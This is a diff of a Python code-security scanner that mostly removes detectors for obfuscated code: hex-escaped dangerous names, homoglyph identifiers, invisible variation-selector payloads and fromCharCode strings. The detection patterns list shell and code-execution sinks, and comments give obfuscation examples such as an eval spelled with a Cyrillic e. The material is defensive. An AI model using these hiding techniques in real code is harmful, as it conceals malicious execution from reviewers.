-            continue
-        if ch == "/":                      # js only: regex literal or division
-            if k >= no_regex_until and _js_regex_allowed(prev, tail):
-                rm = _JS_REGEX_LIT_RE.match(content, k)
-                if rm:
-                    pos = rm.end()
-                    prev, tail = '"', ""
-                    if literals is not None:
-                        literals.append((k, pos))
-                    continue
-                # no closing '/' on this line: the rest of the line holds no
-                # regex literal either (one failed attempt per line keeps the
-                # lexer linear on input like "=/[" repeated)
-                no_regex_until = content.find("\n", k)
-                no_regex_until = n if no_regex_until < 0 else no_regex_until
-            pos = k + 1
-            prev, tail = "/", "/"
-            continue
-        fstring, raw = _py_fstring_prefix(content, k) if fstrings else (False, False)
-        if fstring:
-            pos = _py_fstring_end(content, k, raw)
-            if literals is not None:
-                literals.append((k, pos))
-            continue
-        if mysql:
-            sm = _LEX_MYSQL_STR[ch].match(content, k)
-        else:
-            key = ch * 3 if lang == "py" and content.startswith(ch * 3, k) else ch
-            sm = _LEX_STR[(lang, key)].match(content, k)
-        pos = max(sm.end() if sm else k + 1, k + 1)
-        prev, tail = '"', ""
-        if strings is not None and ch != "`":
-            strings.append((k, pos))
-        if literals is not None:
-            literals.append((k, pos))
-    return spans
-
-
-# ---- Python f-strings as 3.12+ reads them (PEP 701) ----
-_PY_FSTRING_PREFIXES = frozenset(("f", "fr", "rf", "t", "tr", "rt"))
-_FSTR_TEXT_STOP = {q: re.compile("[{}\\\\\n" + q + "]") for q in ("'", '"')}
-_FSTR_FIELD_STOP = re.compile(r"[#'\"(){}\[\]:]")
-
-
-def _py_name_char(ch):
-    """A character that may continue a Python name, for prefix purposes:
-    ASCII letters, digits and '_', and every non-ASCII character."""
-    return ch == "_" or not ch.isascii() or ch.isalnum()
-
-
-def _py_fstring_prefix(s, k):
-    """(is an f-/t-string, raw) for the string literal whose quote is at
-    s[k]: the name characters right before the quote must be exactly a
-    prefix (`if"x"` is a keyword and a plain string)."""
-    j = k
-    while j > 0 and k - j <= 2 and _py_name_char(s[j - 1]):
-        j -= 1
-    if k - j > 2 or (j > 0 and _py_name_char(s[j - 1])):
-        return False, False
-    p = s[j:k].lower()
-    return p in _PY_FSTRING_PREFIXES, "r" in p
-
-
-def _py_fstring_end(s, k, raw):
-    """Index just past the f-string whose opening quote is at s[k], as the
-    3.12+ tokenizer reads it: its replacement fields are code (strings in
-    any quotes, comments, newlines, nested f-strings), a format spec ends at
-    '}' or at the f-string's own closing quote, `{{` `}}` are text, a
-    backslash hides the next character but not a brace, and `\\N{…}` is one
-    escape. A single-quoted f-string also ends, unterminated, at a newline
-    in its text; len(s) when nothing ends it."""
-    n = len(s)
-    q = s[k]
-    ql = 3 if s.startswith(q * 3, k) else 1
-    # frames: ["S", quote, qlen, raw] the text of an f-string; ["P", …] a
-    # format spec (with its f-string's quote); ["F", depth, quote, qlen,
-    # raw] a replacement field's code, depth counting ( [ {
-    stack = [["S", q, ql, raw]]
-    i = k + ql
-    named = False                      # after \N{: the next '}' ends that escape
-    while stack:
-        fr = stack[-1]
-        if fr[0] != "F":
-            q, ql, rw = fr[1], fr[2], fr[3]
-            m = _FSTR_TEXT_STOP[q].search(s, i)
-            if m is None:
-                return n
-            i = m.start()
-            c = s[i]
-            if c == q:
-                if ql == 3 and not s.startswith(q * 3, i):
-                    i += 1
-                    continue
-                i += ql
-                while stack.pop()[0] != "S":        # its fields and specs end with it
-                    pass
-                named = False
-            elif c == "\n":
-                if fr[0] == "P":
-                    stack.pop()                     # a newline ends a format spec
-                elif ql == 1:                       # unterminated: ends at the newline
-                    while stack.pop()[0] != "S":
-                        pass
-                else:
-                    i += 1
-                named = False
-            elif c == "\\":
-                nx = s[i + 1:i + 2]
-                if nx == "{" or nx == "}":
-                    i += 1                          # the brace is read on its own
-                elif not rw and nx == "N" and s.startswith("{", i + 2):
-                    i += 3
-                    named = True
-                else:
-                    i += 2
-            elif c == "{":
-                if fr[0] == "S" and s.startswith("{", i + 1):
-                    i += 2                          # '{{'
-                else:
-                    stack.append(["F", 0, q, ql, rw])
-                    i += 1
-                named = False
-            elif named:                             # '}' closing \N{…}
-                named = False
-                i += 1
-            elif fr[0] == "P":
-                stack.pop()                         # the field reads this '}'
-            else:                                   # '}}', or a stray '}'
-                i += 2 if s.startswith("}", i + 1) else 1
-            continue
-        m = _FSTR_FIELD_STOP.search(s, i)
-        if m is None:
-            return n
-        i = m.start()
-        c = s[i]
-        if c == "#":                                # a comment: to end of line
-            e = s.find("\n", i)
-            if e < 0:
-                return n
-            i = e
-        elif c == "'" or c == '"':
-            is_f, sraw = _py_fstring_prefix(s, i)
-            ql = 3 if s.startswith(c * 3, i) else 1
-            if is_f:
-                stack.append(["S", c, ql, sraw])
-                i += ql
-            else:
-                sm = _LEX_STR[("py", c * ql)].match(s, i)
-                i = max(sm.end() if sm else i + 1, i + 1)
-        elif c in "([{":
-            fr[1] += 1
-            i += 1
-        elif c == ")" or c == "]":
-            fr[1] = max(fr[1] - 1, 0)
-            i += 1
-        elif c == "}":
-            i += 1
-            if fr[1]:
-                fr[1] -= 1
-            else:
-                stack.pop()                         # the field ends
-        else:                                       # ':'
-            if not fr[1]:
-                stack.append(["P", fr[2], fr[3], fr[4]])
-            i += 1
-    return i
-
-
-# ---- JavaScript read as JSX ----
-_JSX_JS_NEXT = re.compile(r"[/'\"`{}<]")
-_JSX_FILE_NEXT = re.compile(r"[/'\"`<]")       # the file's own code: its braces need no count
-_JSX_TEXT_NEXT = re.compile(r"[{}<>]")
-_JSX_WS_RE = re.compile(r"[ \t\n\r\f\v]*")
-_JSX_NAME_RE = re.compile(r"[A-Za-z0-9_$.:\-\x80-\U0010ffff]*")
-_JSX_KEYWORDS = _JS_REGEX_KEYWORDS | {"default"}
-
-
-def _jsx_name_start(ch):
-    return ch.isascii() and (ch.isalpha() or ch in "_$") or not ch.isascii()
-
-
-def _jsx_tag_at(s, j):
-    """Where the tag name (or the '>' of a fragment) starts when a '<' ends
-    just before s[j], else -1."""
-    j = _JSX_WS_RE.match(s, j).end()
-    if j < len(s) and (s[j] == ">" or _jsx_name_start(s[j])):
-        return j
-    return -1
-
-
-def _lex_js_jsx(content, strings=None, literals=None):
-    """JavaScript comment spans in the JSX reading (see the lexer notes):
-    the base lexer, plus elements, whose text and attribute strings hold
-    no comments and whose `{…}` hold code again."""
-    spans = []
-    n = len(content)
-    pos = 0
-    prev, tail = "", ""
-    no_regex_until = -1
-    # frames: ["js", depth] code (the bottom frame is the file, the others a
-    # `{…}` inside JSX, depth counting its own braces); ["tag"] an opening
-    # tag's attributes; ["text"] an element's children
-    stack = [["js", 0]]
-
-    def element_done():
-        nonlocal prev, tail
-        if stack[-1][0] == "js":
-            prev, tail = '"', ""
-
-    while pos < n:
-        fr = stack[-1]
-        kind = fr[0]
-        if kind == "js":
-            m = (_JSX_JS_NEXT if len(stack) > 1 else _JSX_FILE_NEXT).search(content, pos)
-            if m is None:
-                break
-            k = m.start()
-            if k > pos:
-                seg = content[pos:k].rstrip()
-                if seg:
-                    prev, tail = seg[-1], seg[-11:]
-            ch = content[k]
-            two = content[k:k + 2]
-            if two == "//":
-                e = content.find("\n", k)
-                e = n if e < 0 else e
-                spans.append((k, e))
-                pos = e
-            elif two == "/*":
-                e = content.find("*/", k + 2)
-                e = n if e < 0 else e + 2
-                spans.append((k, e))
-                pos = e
-            elif ch == "/":
-                pos = k + 1
-                if k >= no_regex_until and _js_regex_allowed(prev, tail):
-                    rm = _JS_REGEX_LIT_RE.match(content, k)
-                    if rm:
-                        pos = rm.end()
-                        prev, tail = '"', ""
-                        if literals is not None:
-                            literals.append((k, pos))
-                        continue
-                    no_regex_until = content.find("\n", k)
-                    no_regex_until = n if no_regex_until < 0 else no_regex_until
-                prev, tail = "/", "/"
-            elif ch == "{":
-                fr[1] += 1
-                pos = k + 1
-                prev, tail = "{", "{"
-            elif ch == "}":
-                pos = k + 1
-                if fr[1]:
-                    fr[1] -= 1
-                elif len(stack) > 1:
-                    stack.pop()                     # a `{…}` inside JSX ends
-                    continue
-                prev, tail = "}", "}"
-            elif ch == "<":
-                t = -1
-                if prev in (")", "]") or _js_regex_allowed(prev, tail, _JSX_KEYWORDS):
-                    t = _jsx_tag_at(content, k + 1)
-                if t >= 0:
-                    stack.append(["tag"])
-                    pos = _JSX_NAME_RE.match(content, t).end()
-                else:
-                    pos = k + 1
-                    prev, tail = "<", "<"
-            else:                                   # a string or template literal
-                sm = _LEX_STR[("js", ch)].match(content, k)
-                pos = max(sm.end() if sm else k + 1, k + 1)
-                prev, tail = '"', ""
-                if strings is not None and ch != "`":
-                    strings.append((k, pos))
-                if literals is not None:
-                    literals.append((k, pos))
-            continue
-        if kind == "tag":
-            j = _JSX_WS_RE.match(content, pos).end()
-            if j >= n:
-                break
-            c = content[j]
-            two = content[j:j + 2]
-            if two == "/>":
-                stack.pop()
-                pos = j + 2
-                element_done()
-                continue
-            if c == ">":
-                stack[-1] = ["text"]
-                pos = j + 1
-                continue
-            if two == "//" or two == "/*":          # comments may sit between attributes
-                e = content.find("\n" if two == "//" else "*/", j + 2)
-                e = n if e < 0 else (e if two == "//" else e + 2)
-                spans.append((j, e))
-                pos = e
-                continue
-            if c == "{":
-                stack.append(["js", 0])
-                pos = j + 1
-                prev, tail = "{", "{"
-                continue
-            if c == '"' or c == "'":                # no escapes in JSX attribute strings
-                e = content.find(c, j + 1)
-                e = n if e < 0 else e + 1
-                if strings is not None:
-                    strings.append((j, e))
-                if literals is not None:
-                    literals.append((j, e))
-                pos = e
-                continue
-            if c == "=":
-                pos = j + 1
-                continue
-            if _jsx_name_start(c):
-                pos = _JSX_NAME_RE.match(content, j).end()
-                continue
-            t = _jsx_tag_at(content, j + 1) if c == "<" else -1
-            if t >= 0:                              # an element as an attribute value
-                stack.append(["tag"])
-                pos = _JSX_NAME_RE.match(content, t).end()
-                continue
-            abort = j
-        else:                                       # element text
-            m = _JSX_TEXT_NEXT.search(content, pos)
-            if m is None:
-                break
-            k = m.start()
-            c = content[k]
-            if c == "{":
-                stack.append(["js", 0])
-                pos = k + 1
-                prev, tail = "{", "{"
-                continue
-            if c == "<":
-                j = _JSX_WS_RE.match(content, k + 1).end()
-                if content.startswith("/", j):      # a closing tag
-                    j = _JSX_WS_RE.match(content, j + 1).end()
-                    j = _JSX_NAME_RE.match(content, j).end()
-                    j = _JSX_WS_RE.match(content, j).end()
-                    if content.startswith(">", j):
-                        stack.pop()
-                        pos = j + 1
-                        element_done()
-                        continue
-                else:
-                    t = _jsx_tag_at(content, k + 1)
-                    if t >= 0:
-                        stack.append(["tag"])
-                        pos = _JSX_NAME_RE.match(content, t).end()
-                        continue
-            abort = k
-        # not JSX after all: back to the code around it, from this character
-        while stack[-1][0] != "js":
-            stack.pop()
-        pos = abort
-        prev, tail = "<", "<"
-    return spans
 
 
 def _line_starts(content):
@@ -3263,19 +3108,6 @@ def jsx_reading(path):
     return not str(path).lower().endswith((".ts", ".mts", ".cts"))
 
 
-def is_comment(line, lang):
-    """Single-line form of comment_mask() for callers without file context:
-    the line is lexed on its own (no block comment or template open at its
-    start). A ` * foo` line is therefore NOT a comment here — only
-    comment_mask() over the whole file knows a block comment is open."""
-    t = line.strip()
-    if not t:
-        return False
-    if lang == "py":
-        return t.startswith("#")
-    return comment_mask([line], lang)[0]
-
-
 def source_lines(content, lang):
     """content -> lines exactly as scan_file numbers them: CRLF/CR are
     normalized to LF, and for JavaScript U+2028/U+2029 (ECMAScript line
@@ -3302,7 +3134,7 @@ _JS_UESC_RE = re.compile(r"\\u\{([0-9A-Fa-f]{1,6})\}|\\u([0-9A-Fa-f]{4})")
 
 #: Identifier characters since Unicode 15.1 only (ZWNJ, ZWJ and the two
 #: katakana middle dots): Python 3.13+ and current Node say so, 3.10-3.12 not.
-_LATER_ID_CONTINUE = frozenset((0x200C, 0x200D, 0x30FB, 0xFF65))
+_LATER_ID_CONTINUE = frozenset("\u200c\u200d\u30fb\uff65")
 
 
 def _js_ident_char(m):
@@ -3312,7 +3144,7 @@ def _js_ident_char(m):
     if cp > 0x10FFFF:
         return None
     ch = chr(cp)
-    if ch == "$" or cp in _LATER_ID_CONTINUE:
+    if ch == "$" or ch in _LATER_ID_CONTINUE:
         return ch
     return ch if _unicode13.assigned(cp) and ("a" + ch).isidentifier() else None
 
@@ -3693,277 +3525,6 @@ def redact_secret_snippet(rid, snippet, flagged_idx, raw_line):
     return out
 
 
-# ---------------- Hex-escape decoding (SC-HEXSTR) ----------------
-# Obfuscation means escaping characters that did not need it: "\x65\x76\x61\x6c"
-# spells "eval". Binary data (NUL bytes, byte-order marks, UTF-8 sequences,
-# protocol bytes) legitimately *needs* escapes and is never flagged.
-_HEX_ESCAPE_RE = re.compile(r"\\x([0-9A-Fa-f]{2})")
-HEX_MIN_ESCAPES = 8
-HEX_PRINTABLE_SHARE = 0.75
-_LETTER_RUN_RE = re.compile(r"[A-Za-z]{3}")
-HIDDEN_TEXT_DANGER_RE = re.compile(
-    r"https?://|\b(?:eval|exec|execSync|compile|__import__|import|require|child_process|"
-    r"subprocess|system|popen|spawn|powershell|cmd\.exe|curl|wget|base64|b64decode|atob|"
-    r"Function|fromCharCode|marshal|pickle)\b|/bin/(?:ba)?sh", re.I)
-
-
-def hex_hidden_text(line):
-    r"""The readable text hidden in a line's \xNN escapes, or None when the
-    escapes encode binary data (or there are too few to matter)."""
-    codes = [int(h, 16) for h in _HEX_ESCAPE_RE.findall(line)]
-    if len(codes) < HEX_MIN_ESCAPES:
-        return None
-    printable = [c for c in codes if 0x20 <= c < 0x7F]
-    if len(printable) / len(codes) < HEX_PRINTABLE_SHARE:
-        return None
-    text = "".join(map(chr, printable))
-    # Readable means words: palette bytes and punctuation tables that happen to
-    # fall in the printable range ("-95479:37", "!$*-:=?[]") are data.
-    letters = sum(ch.isalpha() for ch in text)
-    if not _LETTER_RUN_RE.search(text) or letters / len(text) < 0.4:
-        return None
-    return text
-
-
-# Fewer escapes than HEX_MIN_ESCAPES still hide a name when the name is the
-# point (analyst gap): global["\x72\x65\x71\x75\x69\x72\x65"]("child_process")
-# spells require in 7 escapes, "\x65val" eval in one. Nothing needs to escape
-# a letter, digit or "_" of such a name, so a string literal in which a
-# dangerous name (HIDDEN_TEXT_DANGER_RE) has one of those written as an
-# escape — \xNN, \uNNNN, \u{N…}, \UNNNNNNNN or a three-digit octal escape of a
-# printable ASCII character — is SC-HEXSTR, CRITICAL, whatever the count.
-# Punctuation escapes do not count (serializers write "/" as \u002F:
-# "https:\u002F\u002F…" hides no URL), a literal whose escapes are mostly
-# binary data is data (b"\x00\x04\x65xec" is a packet), and an escape after
-# an odd run of backslashes is an escaped backslash and text.
-_NAME_ESCAPE_RE = re.compile(
-    r"\\(?:x([0-9A-Fa-f]{2})|u([0-9A-Fa-f]{4})|u\{([0-9A-Fa-f]{1,6})\}|U([0-9A-Fa-f]{8})|([0-7]{3}))")
-
-
-def hex_hidden_name(line):
-    r"""(name, column) for the first string literal on this line whose
-    escape sequences spell part of a dangerous name ("\x65val",
-    global["\x72\x65\x71…"]), else None: the name as decoded, and the
-    column of its first escaped letter, digit or "_"."""
-    if "\\" not in line:
-        return None
-    for lit in STRING_LIT_RE.finditer(line):
-        if "\\" in lit.group():
-            found = _hidden_name_in(lit.group()[1:-1], lit.start() + 1)
-            if found is not None:
-                return found
-    return None
-
-
-def _hidden_name_in(seg, offset):
-    pieces, esc_at, esc_col = [], [], []
-    pos = size = total = printable = 0
-    for m in _NAME_ESCAPE_RE.finditer(seg):
-        start = run = m.start()
-        while run > 0 and seg[run - 1] == "\\":
-            run -= 1
-        if (start - run) % 2:
-            continue                        # "\\x65": an escaped backslash, then text
-        total += 1
-        digits = m.group(1) or m.group(2) or m.group(3) or m.group(4)
-        code = int(digits, 16) if digits is not None else int(m.group(5), 8)
-        if code > 0x10FFFF:
-            continue                        # no character: left as written
-        ch = chr(code)
-        pieces.append(seg[pos:start])
-        size += start - pos
-        if 0x20 <= code < 0x7F:
-            printable += 1
-            if ch.isalnum() or ch == "_":
-                esc_at.append(size)
-                esc_col.append(offset + start)
-        pieces.append(ch)                   # every escape decoded: b"\x00\x65val" holds the word eval
-        size += 1
-        pos = m.end()
-    if not esc_at or printable / total < HEX_PRINTABLE_SHARE:
-        return None
-    pieces.append(seg[pos:])
-    text = "".join(pieces)
-    for m in HIDDEN_TEXT_DANGER_RE.finditer(text):
-        k = bisect.bisect_left(esc_at, m.start())
-        if k < len(esc_at) and esc_at[k] < m.end():
-            return m.group(), esc_col[k]
-    return None
-
-
-# ---------------- Look-alike identifiers (SC-HOMOGLYPH) ----------------
-# A name spelled with letters from another alphabet that look like Latin ones
-# reads as a name it is not (the homoglyph half of Trojan Source,
-# CVE-2021-42694): `const \u0435val = eval; \u0435val(x)`, with a Cyrillic e
-# (U+0435), calls eval where no reviewer sees eval called, and isAdm\u0456n
-# (a Cyrillic i) is not isAdmin. _LOOKALIKES maps the letters drawn like a
-# Latin letter in common fonts: Cyrillic, Greek capitals, omicron and lunate
-# sigma, Armenian o and u, Latin alpha and script g. Not every confusable:
-# Greek alpha, nu and rho, the variables of scientific code, are left out.
-# JavaScript also takes NFKC's compatibility forms as names of their own
-# (fullwidth \uff45val is not eval there; Python reads it as eval) and allows
-# the invisible U+200C / U+200D inside a name. A name whose skeleton
-# (look-alikes mapped, invisibles dropped) is an ASCII name it is not is
-# SC-HOMOGLYPH: CRITICAL when it reads as a code-execution or network name
-# (_LOOKALIKE_TARGETS) or as another name in the file (three characters or
-# more), MAJOR when it mixes ASCII letters with look-alikes. Anything else —
-# a Cyrillic word — is left alone. Names are read where the lexer reads code
-# (_FileCtx.names_code): not in comments, strings (a template or f-string
-# whole, fields too) or regex literals, whose escapes are not names either:
-# ajv's /http[s\u017F]?/ holds no name "s\u017f", nor a class like
-# [a-zA-Z\u0430-\u044f] a name "Z\u0430". (This file writes every
-# such character as an escape.)
-_LOOKALIKES = dict(zip(
-    "\u0430\u0435\u043e\u0440\u0441\u0443\u0445\u0455\u0456\u0458\u04bb\u0501\u051b\u051d\u04cf"   # Cyrillic
-    "\u0410\u0412\u0415\u041a\u041c\u041d\u041e\u0420\u0421\u0422\u0425\u0405\u0406\u0408\u04ae\u051a\u051c\u04c0"
-    "\u0391\u0392\u0395\u0396\u0397\u0399\u039a\u039c\u039d\u039f\u03a1\u03a4\u03a5\u03a7\u03dc"   # Greek
-    "\u03bf\u03f2\u03f3"
-    "\u0585\u057d"                                                                                  # Armenian
-    "\u0251\u0261",                                                                                 # Latin (IPA)
-    "aeopcyxsijhdqwl" "ABEKMHOPCTXSIJYQWI" "ABEZHIKMNOPTYXF" "ocj" "ou" "ag"))
-_LOOKALIKE_TARGETS = frozenset((
-    "eval", "exec", "execSync", "execFile", "execFileSync", "spawn", "spawnSync", "fork", "Function",
-    "require", "import", "__import__", "import_module", "compile", "system", "popen", "Popen",
-    "check_output", "check_call", "getoutput", "child_process", "subprocess", "os", "vm",
-    "runInThisContext", "runInNewContext", "runInContext", "atob", "b64decode", "fromCharCode",
-    "globalThis", "window", "global", "process", "Buffer", "setTimeout", "setInterval", "getattr",
-    "builtins", "__builtins__", "marshal", "pickle", "fetch", "urlopen", "socket"))
-_NAME_RUN_RE = re.compile(r"[\w$\u200c\u200d]+")
-_ASCII_WORD_RE = re.compile(r"[A-Za-z0-9_$]+")
-_ASCII_LETTER_RE = re.compile(r"[A-Za-z]")
-_INVISIBLE_IN_NAMES = frozenset("\u200c\u200d")
-
-
-def lookalike_name(code, lang, words):
-    """(name, reads_as, severity, other, detail, column) for the first name
-    in `code` (a line as _FileCtx.names_code reads it: comments removed,
-    literals blanked) that reads as an ASCII name it is not (see above),
-    else None. `words()` gives the file's ASCII words; it is called only
-    when a look-alike name is found."""
-    if code.isascii():
-        return None
-    for m in _NAME_RUN_RE.finditer(code):
-        name = m.group()
-        if name.isascii() or (m.start() and code[m.start() - 1] == "\\"):
-            continue                        # after an escape left as written (\uFF07 is no name)
-        seen = unicodedata.normalize("NFKC", name) if lang == "js" else name
-        skeleton = "".join(_LOOKALIKES.get(ch, ch) for ch in seen if ch not in _INVISIBLE_IN_NAMES)
-        if not skeleton or skeleton == name or not skeleton.isascii() or skeleton[0].isdigit():
-            continue
-        if skeleton in _LOOKALIKE_TARGETS:
-            severity, other = "CRITICAL", False
-        elif len(skeleton) >= 3 and skeleton in words():
-            severity, other = "CRITICAL", True
-        elif _ASCII_LETTER_RE.search(name):
-            severity, other = "MAJOR", False
-        else:
-            continue
-        parts = []
-        for ch in name:
-            if ch.isascii():
-                continue
-            if ch in _INVISIBLE_IN_NAMES:
-                part = f"an invisible U+{ord(ch):04X}"
-            else:
-                shown = unicodedata.normalize("NFKC", ch) if lang == "js" else ch
-                part = f"U+{ord(ch):04X} for {''.join(_LOOKALIKES.get(c, c) for c in shown)!r}"
-            if part not in parts:
-                parts.append(part)
-        return name, skeleton, severity, other, ", ".join(parts), m.start()
-    return None
-
-
-_LOOKALIKE_WHY = (
-    "A name written with letters from another alphabet that look like Latin ones, or with an "
-    "invisible character inside it, is not the name a reviewer reads: `const eval = eval` with "
-    "a Cyrillic e (U+0435) makes a second eval that runs where no one sees eval called, and an "
-    "isAdmin with a Cyrillic i is not isAdmin (CVE-2021-42694, the homoglyph half of Trojan "
-    "Source).")
-
-
-def lookalike_issue(found, path, line_no, lines):
-    name, skeleton, severity, other, detail, col = found
-    where = ", another name in this file," if other else ""
-    return mk_issue(
-        {"id": "SC-HOMOGLYPH", "name": "Look-alike identifier", "type": "HOTSPOT", "sev": severity,
-         "msg": f"{name!r} reads as {skeleton!r}{where} but is spelled with {detail}.",
-         "why": _LOOKALIKE_WHY,
-         "fix": "Rename it with the letters it appears to have, and find out why it was written this way.",
-         "ref": "CWE-1007 · CVE-2021-42694"}, path, line_no, lines, col)
-
-
-# ---------------- Invisible-character payload (SC-HIDDEN-UNICODE) ----------------
-# A run of invisible characters carries bytes no reviewer or diff can see:
-# variation selectors (U+FE00-FE0F, U+E0100-E01EF) or tag characters
-# (U+E0000-E007F). GlassWorm (Oct 2025, 150+ repos across npm and VS Code) hid
-# its payload in variation selectors and decoded it with a codePointAt map into
-# eval; tag characters smuggle instructions past a reviewer and an AI reading
-# the file. The only ordinary runs are a flag emoji (a U+1F3F4 base, tag
-# letters, the U+E007F terminator), left alone, and a lone emoji variation
-# selector (U+FE0F), one character and below the run threshold. A run in a file
-# that runs code from a string (eval, Function, exec) is CRITICAL (the GlassWorm
-# shape), else MAJOR.
-_HIDDEN_RUN_RE = re.compile("[\U0000FE00-\U0000FE0F\U000E0000-\U000E01EF]{2,}")
-_FLAG_EMOJI_BASE = "\U0001F3F4"
-_TAG_START = "\U000E0000"
-_TAG_END = "\U000E007F"
-_HIDDEN_EXEC_RE = re.compile(
-    r"(?<![\w$.])(?:eval|Function|execSync|exec|runInThisContext|runInNewContext|runInContext)\s*\(")
-
-
-def _hidden_flag_emoji(line, m):
-    """The run m is a flag emoji's tag sequence (a U+1F3F4 base, tag letters,
-    the U+E007F terminator): an ordinary run, left alone."""
-    run = m.group()
-    return (m.start() > 0 and line[m.start() - 1] == _FLAG_EMOJI_BASE
-            and run.endswith(_TAG_END) and all(_TAG_START <= c <= _TAG_END for c in run))
-
-
-def hidden_unicode_run(line):
-    """(col, run) for the first run of invisible carrier characters in `line`
-    that is not a flag emoji, else None."""
-    for m in _HIDDEN_RUN_RE.finditer(line):
-        if not _hidden_flag_emoji(line, m):
-            return m.start(), m.group()
-    return None
-
-
-_HIDDEN_UNICODE_WHY = (
-    "Invisible characters in source carry bytes that no review or diff shows: a variation selector or a "
-    "tag character has no business in code. GlassWorm hid a payload in variation selectors and decoded it "
-    "into eval; tag characters smuggle instructions past a reviewer and an AI reading the file. Only a flag "
-    "emoji and a single emoji variation selector are ordinary.")
-
-
-def _hidden_unicode_issue(path, line_no, lines, col, run, runs_code):
-    tags = any(_TAG_START <= c <= _TAG_END for c in run)
-    varsel = any(not (_TAG_START <= c <= _TAG_END) for c in run)
-    what = ("variation selectors and tag characters" if tags and varsel
-            else "tag characters" if tags else "variation selectors")
-    return mk_issue(
-        {"id": "SC-HIDDEN-UNICODE", "name": "Invisible-character payload", "type": "HOTSPOT",
-         "sev": "CRITICAL" if runs_code else "MAJOR",
-         "msg": f"A run of {len(run)} invisible {what} carries hidden data in the code"
-                + (", and the file runs code from a string." if runs_code else "."),
-         "why": _HIDDEN_UNICODE_WHY,
-         "fix": "Show the characters as escape sequences and decode what they spell; if it is a payload, do not run the file.",
-         "ref": "CWE-506 · Supply chain"}, path, line_no, lines, col)
-
-
-_PEM_BODY_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")
-
-
-def _token_has_material(rule_re, line, lines, i):
-    """A "-----BEGIN ... PRIVATE KEY-----" header alone is not a key: libraries
-    keep the header as a constant to recognize key files. Require base64 key
-    material after it, on the same line or the next two."""
-    match = rule_re.search(line)
-    if not match or not match.group(0).startswith("-----BEGIN"):
-        return True
-    following = [line[match.end():]] + lines[i + 1:i + 3]
-    return any(_PEM_BODY_RE.search(text) for text in following)
-
-
 # ---------------- Snippets (review fix: shared semantics 7) ----------------
 # A finding used to copy its ±2 context lines whole: a 22.5 KB one-line file
 # produced a 34 MB JSON and a 34 MB HTML report. Every snippet line is now
@@ -4058,6 +3619,14 @@ def mk_issue(rule_or_dict, path, line_no, lines, col=None, redactor=None):
 # MAJOR B-EMPTY-CATCH findings and an 87.7 MB JSON report (120k lines: 66.7 MB).
 CAP_PER_RULE = 200
 _NEVER_CAPPED_PREFIXES = ("S-", "T-", "SC-", "X-", "SQL-")
+_CAPPED_RULE = {
+    "id": "Q-CAPPED", "name": "Findings capped", "type": "SMELL", "sev": "INFO",
+    "msg": "{n} more {rule} findings omitted",
+    "why": ("Findings of one rule that repeat hundreds of times in one file are capped "
+            "so reports stay readable; security findings are never capped."),
+    "fix": ("Fix or deliberately suppress the {rule} pattern in this file, then re-scan "
+            "to see the remaining occurrences."),
+    "ref": "Maintainability"}
 
 
 def _cappable(issue):
@@ -4097,14 +3666,8 @@ def cap_issues(path, issues, lines):
         return issues
     out = [i for k, i in enumerate(issues) if k not in dropped]
     for rid, (n, first, typ) in omitted.items():
-        note = mk_issue(
-            {"id": "Q-CAPPED", "name": "Findings capped", "type": "SMELL", "sev": "INFO",
-             "msg": f"{n} more {rid} findings omitted",
-             "why": "Findings of one rule that repeat hundreds of times in one file are capped "
-                    "so reports stay readable; security findings are never capped.",
-             "fix": f"Fix or deliberately suppress the {rid} pattern in this file, then re-scan "
-                    "to see the remaining occurrences.",
-             "ref": "Maintainability"}, path, first, lines)
+        note = mk_issue(dict(_CAPPED_RULE, msg=_CAPPED_RULE["msg"].format(n=n, rule=rid),
+                             fix=_CAPPED_RULE["fix"].format(rule=rid)), path, first, lines)
         # what the note stands for: the maintainability rating counts the
         # omitted findings, not the note (see maintainability_rating)
         note["omitted"] = n
@@ -4224,7 +3787,6 @@ def extract_functions(lines, lang):
                         "cx": 1 + cx_prefix[end + 1] - cx_prefix[i]})
     return fns
 
-DEP_RULE_PREFIXES = ("SC-", "S-TOKEN", "S-SECRET")
 
 # ---------------- SQL sink analysis (G12) ----------------
 # The line-rule S-SQL-PY only sees formatting applied to a literal *inside*
@@ -4318,83 +3880,6 @@ SQL_ARG_MAX = 10000
 _PAREN_TOKEN_RE = re.compile(r"[()\"']")
 
 
-# SC-CHARCODE: String.fromCharCode building text from character codes that
-# are written in the code: ten or more 2-3 digit numbers inside the call's
-# own parentheses (`fromCharCode(104,116,116,112,…)`, also through .apply /
-# .call), or a name the call uses that the same line assigns an array of ten
-# or more printable-ASCII codes (`k=[104,116,…];…fromCharCode(...k)`). It
-# used to count numbers anywhere on the line, so every fromCharCode on a long
-# minified line fired: binary parsers (`fromCharCode(255&e)`,
-# `fromCharCode(...u.subarray(0,l))`) and UTF-16 surrogate encoders
-# (`fromCharCode(e>>>10&1023|55296)`); and any such array anywhere on the line
-# (npm:extract-youtube's 98 KB line) counted for every call on it.
-CHARCODE_NUM_RE = re.compile(r"\b\d{2,3}\b")
-_CHARCODE_TABLE_RE = re.compile(
-    r"(?<![\w$.])([A-Za-z_$][\w$]*)\s*=\s*\[((?:\s*[0-9]{2,3}\s*,){9,}\s*[0-9]{2,3})\s*\]")
-# a bare name (not `o.k`; `...k` is a spread)
-_CHARCODE_NAME_RE = re.compile(r"(?<![\w$])(?:(?<=\.\.\.)|(?<!\.))[A-Za-z_$][\w$]*")
-_CHARCODE_CALL_TAIL_RE = re.compile(r"\s*(?:\.\s*(?:apply|call)\s*)?\(")
-CHARCODE_ARGS_MAX = 4000        # chars of one call's arguments searched
-# Chars of argument scanning per line; past it a call's arguments are taken to
-# run CHARCODE_ARGS_MAX chars (over-counting, never under-counting), so a line
-# of 50,000 unclosed calls stays linear.
-CHARCODE_SCAN_BUDGET = 200_000
-
-
-def _call_args_end(line, k, stop):
-    """Index of the ')' that closes the '(' at k, or None before `stop`.
-    Scanned from k itself, skipping ' " ` strings (with backslash escapes):
-    the quote state of a whole minified line is not reliable (a quote in a
-    regex or template literal), but the arguments of one call are short."""
-    depth, quote, j = 0, None, k
-    while j < stop:
-        c = line[j]
-        if quote is not None:
-            if c == "\\":
-                j += 2
-                continue
-            if c == quote:
-                quote = None
-        elif c in "'\"`":
-            quote = c
-        elif c == "(":
-            depth += 1
-        elif c == ")":
-            depth -= 1
-            if depth == 0:
-                return j
-        j += 1
-    return None
-
-
-def _charcode_col(line):
-    """Column of the String.fromCharCode call that makes `line` SC-CHARCODE,
-    or None (see above). Linear: one pass over the numbers, bounded argument
-    scans."""
-    if CHARCODE_RE.search(line) is None:
-        return None
-    nums = [m.start() for m in CHARCODE_NUM_RE.finditer(line)]
